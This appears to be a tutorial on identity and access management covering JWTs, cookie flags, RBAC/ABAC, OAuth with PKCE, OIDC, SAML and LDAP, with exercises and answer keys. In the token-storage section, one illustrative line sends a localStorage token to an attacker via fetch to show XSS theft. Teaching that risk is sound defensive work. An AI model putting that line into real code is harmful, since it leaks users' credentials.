# IAM

IAM — **Identity and Access Management** — answers two questions every app has to ask on every
request: *who are you?* and *what are you allowed to do?* This guide builds up the answer from a
single login to enterprise single sign-on:

1. **Taxonomy**: authentication vs. authorization — the two questions, kept straight
2. **Sessions and Tokens**: how a server remembers you after login — server-side sessions vs. JWTs
3. **Storing Tokens in the Browser**: cookies vs. `localStorage`, and the XSS/CSRF tradeoff
4. **Authorization Models**: RBAC and ABAC — deciding what a user may do
5. **Delegated Access**: OAuth, PKCE, and OIDC — logging in with, and acting on behalf of, another
   service
6. **Enterprise Identity**: SAML and LDAP — single sign-on and directories inside organizations

The progression moves outward: first your own app proving and remembering who a user is, then
deciding what they can do, then handing identity off to (and accepting it from) other systems.

---

# Taxonomy

Two words sit at the center of IAM and get mixed up constantly because they both start with "auth."
Pin them down first; everything else is a variation on one or the other.

## Authentication vs. Authorization

- **Authentication (AuthN)** — *who are you?* Proving identity: a password, a magic link, a
  fingerprint, a token. The output is "this request is from user 1138."
- **Authorization (AuthZ)** — *what are you allowed to do?* Deciding whether that identity may
  perform an action: read this document, delete that user, access the admin panel.

Authentication always comes first — you can't decide what someone may do until you know who they
are — but they're separate systems. You can be authenticated and still forbidden.

HTTP even has separate status codes for the two, and their names are famously misleading:

- **`401 Unauthorized`** actually means *not authenticated* — we don't know who you are. Log in.
- **`403 Forbidden`** means *authenticated but not authorized* — we know who you are, and you still
  can't do this.

### Check your understanding

**Q: A logged-in user hits an admin-only page and gets a `403`, not a `401`. Why is that the correct
code?**

<details>
<summary>Show answer</summary>

The user is authenticated — the server knows who they are — so the failure is one of authorization,
not authentication. `403 Forbidden` says "we know who you are and you may not do this." A `401`
would wrongly imply they need to log in, which won't help.

</details>

---

# Sessions and Tokens

HTTP is **stateless**: the server forgets you the instant a response is sent. So after a successful
login, how does the *next* request prove it's still you? The server hands the client a credential at
login, and the client sends it back on every subsequent request. There are two ways to design that
credential, and the choice shapes how your whole system scales.

## Server-Side Sessions

The server stores the session data (who you are, when you logged in) in its own store — memory,
Redis, a database — and hands the client only an opaque random **session ID**, usually in a cookie.
On each request the server looks the ID up.

- **Stateful.** The truth lives on the server. To scale past one server, every instance needs to
  reach a shared session store.
- **Easy to revoke.** Logging out, or banning a user, is just deleting the row. The next request
  fails to look up.

## JSON Web Tokens (JWT)

A **JWT** flips it: instead of storing state, the server *signs* a token containing the user's
claims and hands the whole thing to the client. On each request the server verifies the signature —
no lookup needed, because the token carries its own data.

A JWT is three base64url parts joined by dots — `header.payload.signature`:

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMTM4Iiwicm9sZSI6ImVkaXRvciJ9.K3v...signature
└────── header ──────┘ └──────────── payload (claims) ───────────┘ └ signature ┘
```

```js
import jwt from "jsonwebtoken";

// At login: sign a short-lived token with the user's claims
const token = jwt.sign({ sub: user.id, role: user.role }, SECRET, { expiresIn: "15m" });

// On each request: verify the signature and expiry — no database lookup
const claims = jwt.verify(token, SECRET); // throws if tampered with or expired
```

- **Stateless.** Any server with the key can verify the token, so horizontal scaling is trivial — no
  shared session store.
- **Hard to revoke.** The token is valid until it expires; the server isn't consulting a store it
  can delete from. That's why access tokens are kept **short-lived** (minutes) and paired with a
  longer-lived **refresh token** used to mint new ones.

> **Heads-up:** the JWT payload is *signed, not encrypted* — it's only base64-encoded, so anyone
> holding the token can read every claim in it. The signature stops **tampering**, not **reading**.
> Never put secrets in a JWT, and treat it like the password it effectively is.

## Which to Use

| | Server-side session | JWT |
|---|---|---|
| State | Stored on server | Carried in the token |
| Verification | Look up the ID in a store | Verify the signature |
| Scaling | Needs a shared session store | Any server with the key, no store |
| Revocation | Delete the record — instant | Wait for expiry, or keep a denylist |
| Reading the contents | Opaque ID, meaningless to client | Readable by anyone holding it |

Rule of thumb: server-side sessions for a classic web app where instant logout matters; JWTs for
stateless APIs, service-to-service calls, and systems that must scale horizontally without shared
state.

### Exercise

```exercise
type: code
runtime: none
prompt: |
  Issue and check a login token. Fill in the option that makes the access
  token short-lived, and the call that validates the signature and expiry on
  each request (not one that merely decodes without verifying).
starter: |
  import jwt from "jsonwebtoken";

  export function issueToken(user, secret) {
    return jwt.sign({ sub: user.id, role: user.role }, secret, {
      __1__: "15m",
    });
  }

  export function authenticate(token, secret) {
    // Must reject tampered or expired tokens, not just read the payload
    return jwt.__2__(token, secret);
  }
solution: |
  import jwt from "jsonwebtoken";

  export function issueToken(user, secret) {
    return jwt.sign({ sub: user.id, role: user.role }, secret, {
      expiresIn: "15m",
    });
  }

  export function authenticate(token, secret) {
    return jwt.verify(token, secret);
  }
verify: A valid token returns its claims; a tampered signature or an expired token throws and is rejected.
```

### Check your understanding

**Q: You store a user's role inside a JWT and decide permissions from it. An attacker edits the
payload to `"role":"admin"`. Does the change take effect?**

<details>
<summary>Show answer</summary>

No — editing the payload invalidates the signature, so `jwt.verify` throws and the request is
rejected. The signature is exactly what protects the claims from tampering. (But note: the attacker
*could* still read the original role, because the payload is only encoded, not encrypted.)

</details>

**Q: A user clicks "log out" but their JWT keeps working for another 14 minutes. Why, and how is
this normally handled?**

<details>
<summary>Show answer</summary>

JWTs are stateless — the server validates the signature without consulting a store it can delete
from, so the token stays valid until it expires. Keep access tokens short-lived and use refresh
tokens to renew them; for instant revocation, add a server-side denylist or use server-side
sessions.

</details>

---

# Storing Tokens in the Browser

A browser app has a token or session ID and has to keep it somewhere between requests. The two
options — **`localStorage`/`sessionStorage`** and **cookies** — differ in exactly the way that
matters for security: who can read the credential, and when it gets sent. The choice is really a
choice about which attack you're more exposed to (XSS vs. CSRF — both covered in the Security guide).

## Web Storage: `localStorage` / `sessionStorage`

JavaScript key/value storage. `localStorage` persists until cleared; `sessionStorage` lasts only for
the tab's session.

- **Read by JavaScript** — which means **any XSS on your page can steal the token** with one line:
  `fetch(attacker, { body: localStorage.token })`.
- **Not sent automatically** — you attach it yourself, usually `Authorization: Bearer <token>`.
  Because it isn't attached to cross-site requests, it's naturally **immune to CSRF**.

## Cookies

The browser sends cookies automatically with requests to their domain. Three flags decide how safe
that is:

- **`HttpOnly`** — JavaScript *cannot* read the cookie. This is the big one: it neutralizes XSS
  token theft, because a stolen-via-script attack can't reach the value.
- **`Secure`** — sent only over HTTPS.
- **`SameSite`** — controls whether the cookie rides along on cross-site requests; `Lax`/`Strict`
  is what defends against **CSRF**.

```js
// Recommended for a session cookie: unreadable by JS, HTTPS-only, not sent cross-site
res.cookie("session", sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: "lax",
});
```

## The Tradeoff

| | `localStorage` | `HttpOnly` cookie |
|---|---|---|
| Readable by JavaScript | Yes — XSS can steal it | No — `HttpOnly` blocks script access |
| Sent automatically | No (you attach it) | Yes (browser attaches it) |
| Exposure to XSS theft | High | Low |
| Exposure to CSRF | None | Needs `SameSite` / CSRF token |
| Works cleanly with | Bearer-token APIs, mobile | Classic web apps, same-site APIs |

The common recommendation is an **`HttpOnly`, `Secure`, `SameSite` cookie** for session credentials:
it removes the worst risk (a script reading your token) and the CSRF gap is closed by `SameSite`
plus a token. Putting a long-lived token in `localStorage` trades a hard-to-exploit risk for an
easy one — any XSS, anywhere on the page, walks off with it.

### Check your understanding

**Q: A site keeps its auth token in `localStorage`. A third-party script it loads has an XSS flaw.
What's the exposure, and how would an `HttpOnly` cookie have changed it?**

<details>
<summary>Show answer</summary>

Any JavaScript on the page — including the compromised third-party script — can read `localStorage`,
so the token is stolen outright. An `HttpOnly` cookie can't be read by JavaScript at all, so the
same XSS can't exfiltrate it. (You'd then guard the cookie's auto-send behavior against CSRF with
`SameSite`.)

</details>

---

# Authorization Models

Once a request is authenticated, *authorization* decides what it may do. Two models dominate, and
they answer the question at different granularities.

## RBAC — Role-Based Access Control

Permissions are grouped into **roles**; users are assigned roles. The check asks "does this user's
role include this permission?"

```js
const permissions = {
  admin:  ["read", "write", "delete"],
  editor: ["read", "write"],
  viewer: ["read"],
};

function can(user, action) {
  return permissions[user.role]?.includes(action) ?? false;
}
```

Simple, easy to audit, and enough for most apps. Its limit is **granularity**: roles describe *kinds
of users*, not *relationships to specific resources*. "An editor can edit" is easy; "an editor can
edit only documents in their own department" forces you to invent ever-narrower roles
(`editor-marketing`, `editor-sales`), and they multiply fast — the classic **role explosion**.

## ABAC — Attribute-Based Access Control

ABAC decides from **attributes** evaluated at request time — attributes of the *user*, the
*resource*, and the *context* (time, location, IP):

```js
// "You can edit a doc if you own it, or you manage the team that owns it."
function canEdit(user, doc) {
  return user.id === doc.ownerId
      || (user.dept === doc.dept && user.role === "manager");
}
```

This expresses rules RBAC can't reach without exploding into special-case roles — ownership,
team membership, "business hours only," "same region." The cost is complexity: policies are harder
to enumerate and reason about than a flat list of roles.

| | RBAC | ABAC |
|---|---|---|
| Decision based on | The user's role | Attributes of user, resource, context |
| Granularity | Coarse — kinds of users | Fine — relationships and conditions |
| "Edit your own docs only" | Awkward — needs many roles | Natural — compare `user.id` to `doc.ownerId` |
| Simplicity | Easy to audit | More expressive, more complex |

In practice many systems combine them: RBAC for the broad strokes ("is this an admin?"), ABAC for
resource-specific rules ("does this admin own this record?").

### Exercise

```exercise
type: code
runtime: none
prompt: |
  Implement the authorization check. RBAC: an `editor` may "write". ABAC: a user
  may always edit a document they own, regardless of role. Fill in the
  role-permission lookup and the ownership comparison.
starter: |
  const permissions = {
    admin:  ["read", "write", "delete"],
    editor: ["read", "write"],
    viewer: ["read"],
  };

  export function canEditDoc(user, doc) {
    // RBAC: role grants the "write" action...
    const roleAllows = permissions[user.role]?.includes(__1__) ?? false;
    // ...ABAC: or the user owns this specific document
    const ownsDoc = user.id === doc.__2__;
    return roleAllows || ownsDoc;
  }
solution: |
  const permissions = {
    admin:  ["read", "write", "delete"],
    editor: ["read", "write"],
    viewer: ["read"],
  };

  export function canEditDoc(user, doc) {
    const roleAllows = permissions[user.role]?.includes("write") ?? false;
    const ownsDoc = user.id === doc.ownerId;
    return roleAllows || ownsDoc;
  }
verify: An editor can write any doc; a viewer can edit only docs whose ownerId matches their id.
```

### Check your understanding

**Q: Your app starts with `admin`/`editor`/`viewer` roles. Then product asks: editors should edit
only their own team's content. Why does this strain RBAC, and what fixes it?**

<details>
<summary>Show answer</summary>

RBAC keys off the role alone, which knows nothing about the relationship between *this* user and
*this* resource. Encoding "own team only" as roles means one role per team (`editor-marketing`,
`editor-sales`, …) — role explosion. ABAC fixes it by comparing attributes at request time
(`user.team === doc.team`), no new roles needed.

</details>

---

# Delegated Access

So far the app authenticates users itself. **Delegated access** is the opposite problem: letting one
service act on a user's behalf at *another* service — "Sign in with Google," or "let this app read
your GitHub repos" — without ever handing over the user's password to that other service.

## OAuth 2.0

**OAuth 2.0** is the framework for this. Its whole point is delegated **authorization**: granting an
app limited access to your data somewhere else. Four roles:

- **Resource owner** — you, the user.
- **Client** — the app that wants access.
- **Authorization server** — where you log in and consent (Google's, GitHub's).
- **Resource server** — the API holding your data.

The main flow is the **Authorization Code flow**:

```
1. Client redirects you to the authorization server  (login + consent screen)
2. You approve the requested scopes                  (e.g. "read your repos")
3. Authorization server redirects back with a short-lived authorization CODE
4. Client exchanges the code (+ its secret) for an ACCESS TOKEN, server-to-server
5. Client calls the resource server with the access token
```

The two-step dance — code first, then exchange it for a token on the back channel — exists so the
**access token never travels through the browser/URL**, where it could be logged or leaked. The
code is useless on its own; redeeming it requires the client's secret.

Access is scoped: a **scope** (`repo:read`) limits what the token can do, so the user grants exactly
what's needed and no more.

## PKCE

The Authorization Code flow assumes the client can keep a secret. A **public client** — a
single-page app or a mobile app — can't: its code ships to the user's device, so any secret in it is
visible. That breaks step 4's security, because an attacker who intercepts the authorization code
could redeem it themselves.

**PKCE** (Proof Key for Code Exchange, "pixy") closes that gap without a stored secret:

```js
import crypto from "node:crypto";

// Before redirecting, the client makes a one-time secret and sends only its hash
const verifier  = crypto.randomBytes(32).toString("base64url");
const challenge = crypto.createHash("sha256").update(verifier).digest("base64url");

// 1. Authorize request includes:  code_challenge=<challenge>&code_challenge_method=S256
// 2. Token exchange includes:     code_verifier=<verifier>
//    The server hashes the verifier and checks it matches the challenge it saw earlier.
```

An intercepted code is now worthless: redeeming it requires the original `verifier`, which never
left the legitimate client. PKCE started as a mobile/SPA fix and is now **recommended for all OAuth
clients**.

## OIDC

Here's the catch people trip on: **OAuth is authorization, not authentication.** An access token
proves an app was *granted access* — it doesn't reliably tell you *who the user is*. Apps that used
raw OAuth as a login mechanism opened subtle security holes by assuming "has a token" meant
"is this user."

**OpenID Connect (OIDC)** is a thin identity layer *on top of* OAuth 2.0 that adds real
authentication. It introduces:

- An **ID token** — a JWT containing identity claims (`sub`, `email`, `name`), signed by the
  provider, meant specifically to tell the client *who logged in*.
- A standard **`/userinfo`** endpoint and standard scopes (`openid`, `profile`, `email`).

"Sign in with Google" is OIDC, not bare OAuth. The mental split worth keeping:

| | OAuth 2.0 | OIDC |
|---|---|---|
| Answers | What may this app *access*? | *Who* is this user? |
| Concern | Authorization (delegated access) | Authentication (identity) |
| Gives you | Access token (for calling APIs) | ID token (a JWT identifying the user) |
| Relationship | The framework | A layer built on top of OAuth |

### Check your understanding

**Q: A team builds "Log in with Acme" using plain OAuth: if the app receives a valid access token,
it treats the session as that user. Why is OIDC the right tool instead?**

<details>
<summary>Show answer</summary>

OAuth grants *access*, it doesn't assert *identity*. An access token says an app was authorized, not
who the user is — and tokens issued for one app can be misused to impersonate a user in another.
OIDC adds an ID token (a signed JWT of identity claims) built precisely to answer "who logged in,"
which is what a login needs.

</details>

**Q: Why does a single-page app need PKCE when a traditional server-side web app historically
didn't?**

<details>
<summary>Show answer</summary>

A server-side app is a confidential client — it can keep a client secret on the server to redeem the
authorization code. An SPA ships its code to the browser, so it can't hold a secret; PKCE replaces
the secret with a per-request verifier/challenge pair, so an intercepted code can't be redeemed
without the verifier. (PKCE is now recommended for confidential clients too.)

</details>

---

# Enterprise Identity

Inside an organization, identity is centralized: employees have one account, managed in one place,
that signs them into everything. Two long-standing technologies cover this — one a web SSO protocol,
one a directory — and they often work together.

## SAML

**SAML** (Security Assertion Markup Language) is the XML-based **single sign-on** standard that has
dominated enterprise and B2B for years — it predates OIDC and is still everywhere Okta, Microsoft
Entra/AD FS, and Ping are deployed. Two roles:

- **Identity Provider (IdP)** — where the user authenticates (Okta, AD FS).
- **Service Provider (SP)** — the app the user wants in (your product).

The user authenticates once at the IdP, which sends the SP a **signed XML assertion** vouching for
their identity and attributes. The SP trusts the IdP's signature and logs the user in — without ever
seeing their password. It's the same SSO goal as OIDC, but XML-and-enterprise rather than
JSON-and-modern-web:

| | SAML | OIDC |
|---|---|---|
| Format | XML assertions | JSON / JWT (ID token) |
| Era / fit | Older, enterprise & B2B SSO | Modern web, mobile, APIs |
| Built on | Its own XML standard | OAuth 2.0 |
| Typical use | Corporate app SSO (Okta → your app) | "Sign in with Google," consumer + modern apps |

If you sell software to enterprises, "do you support SAML SSO?" is a question you will be asked.

## LDAP

**LDAP** (Lightweight Directory Access Protocol) is a different layer: it's the protocol for talking
to a **directory** — a hierarchical, tree-structured store of identities (users, groups, devices)
and their attributes. Microsoft's **Active Directory** is the best-known implementation.

Where SAML/OIDC are web **SSO protocols**, LDAP is the **store and a way to authenticate against
it**. An app can authenticate a user by attempting an LDAP **bind** — trying to connect to the
directory with the supplied username and password; success means the credentials are valid. It's
typically on-premises and internal.

The two fit together rather than compete: the directory (LDAP/Active Directory) is often the system
of record for *who exists*, and the IdP (doing SAML or OIDC) reads from it to power web SSO. LDAP
answers "is this person a valid employee, and what groups are they in?"; SAML/OIDC carry that proven
identity out to web apps.

### Check your understanding

**Q: A SaaS vendor says it "supports enterprise SSO via SAML." In that exchange, which side is the
IdP and which is the SP, and what actually crosses between them?**

<details>
<summary>Show answer</summary>

The customer's identity system (Okta, AD FS, …) is the **IdP**; the SaaS product is the **SP**. The
user authenticates at the IdP, which sends the SP a **signed XML assertion** asserting the user's
identity and attributes. The SP trusts the signature and logs the user in — it never receives the
user's password.

</details>

**Q: How do LDAP and SAML play different roles, rather than being alternatives?**

<details>
<summary>Show answer</summary>

LDAP is a directory protocol — the store of *who exists* and how to authenticate against it (the
bind), usually internal/on-prem. SAML is a web SSO protocol that carries an already-proven identity
from an IdP out to web apps. The IdP frequently reads its users *from* an LDAP directory, so they
stack: directory as system of record, SAML for delivering identity to apps.

</details>

---

# Recap

You built up identity and access from one login to enterprise SSO:

- **Taxonomy**: authentication (who are you) precedes authorization (what may you do) — and `401`
  means *not authenticated* while `403` means *authenticated but forbidden*.
- **Sessions and Tokens**: server-side sessions keep state on the server (easy to revoke, needs a
  shared store); JWTs carry signed claims (stateless and scalable, hard to revoke, payload readable —
  signed, not encrypted).
- **Storing Tokens in the Browser**: `localStorage` is exposed to XSS but immune to CSRF; an
  `HttpOnly`/`Secure`/`SameSite` cookie resists XSS theft and closes the CSRF gap — usually the
  better default.
- **Authorization Models**: RBAC assigns permissions by role (simple, coarse, prone to role
  explosion); ABAC decides from attributes of user, resource, and context (fine-grained, more
  complex). Most systems blend them.
- **Delegated Access**: OAuth grants scoped *access* via the Authorization Code flow; PKCE secures
  clients that can't keep a secret; OIDC adds the identity layer OAuth lacks, giving you an ID token
  that says *who* logged in.
- **Enterprise Identity**: SAML is XML-based web SSO between an IdP and your app; LDAP is the
  directory protocol behind the identities — the store SSO often reads from.

The throughline: authenticate first, authorize second, and the harder the system, the more you lean
on a trusted identity provider — OIDC or SAML for the web, backed by a directory — instead of
proving identity yourself.
